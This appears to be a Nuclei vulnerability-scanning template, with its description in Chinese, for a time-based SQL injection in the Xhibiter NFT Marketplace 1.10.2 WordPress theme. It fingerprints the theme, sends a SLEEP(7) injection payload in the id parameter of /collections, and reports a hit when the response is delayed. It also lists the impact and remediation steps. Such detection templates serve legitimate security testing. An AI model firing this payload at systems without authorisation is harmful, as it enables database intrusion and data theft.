id: xhibiter-nft-sqli

info:
  name: Xhibiter NFT Marketplace 1.10.2 - SQL 注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  description: |
    该模板用于检测 Xhibiter NFT Marketplace 1.10.2 - SQL 注入漏洞。该类漏洞通常源于接口将用户可控参数直接拼接进 SQL 语句，导致查询语义被篡改。模板会向 `/`、`/collections?id=2'+AND+(SELECT+1492+FROM+(SELECT(SLEEP(7)))HsLV)+AND+'KEOa'='KEOa` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可通过注入参数读取、篡改或删除数据库中的敏感数据。
    - 在数据库权限过高或支持危险函数的场景下，SQL 注入还可能导致认证绕过、文件读写或进一步执行系统命令。
  remediation: |
    - 对所有数据库访问使用参数化查询或安全 ORM，避免拼接用户可控输入。
    - 对受影响接口的参数进行类型、长度和取值范围校验，并关闭详细数据库错误回显。
    - 使用最小权限数据库账号，排查异常查询、数据导出和新增账号记录。
  reference:
    - https://www.exploit-db.com/exploits/52060
    - https://blog.securelayer7.net/sql-injection-vulnerability-in-xhibiter-nft-marketplace/
    - https://x.com/ExploitDB/status/1807782485549560196
  classification:
    cwe-id: CWE-89
  metadata:
    publicwww-query: "/wp-content/themes/xhibiter/"
    max-request: 2
  tags: xhibiter,sqli,time-based-sqli,wordpress,wp-theme,nft,vuln

flow: http(1) && http(2)

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        part: body
        words:
          - '/wp-content/themes/xhibiter/'
        internal: true

  - raw:
      - |
        GET /collections?id=2'+AND+(SELECT+1492+FROM+(SELECT(SLEEP(7)))HsLV)+AND+'KEOa'='KEOa HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'duration>=7'
        condition: and
